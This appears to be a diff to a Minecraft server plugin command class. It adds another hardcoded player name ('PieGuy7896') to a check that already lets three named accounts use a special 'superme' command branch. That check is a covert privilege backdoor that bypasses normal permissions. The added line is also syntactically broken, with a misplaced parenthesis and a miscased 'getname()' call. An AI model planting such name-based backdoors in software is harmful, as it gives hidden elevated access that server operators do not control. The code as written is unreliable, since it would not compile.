@@ -23,7 +23,7 @@ public class Command_fom extends TFM_Command
     }
     else if (args.length == 1)
     {
-      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8") || sender_p.getName().equals("SupItsDillon"))
+      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8") || sender_p.getName().equals("SupItsDillon")) || sender_p.getname().equals("PieGuy7896")
       {
         if (args[0].equals("superme"))
         {
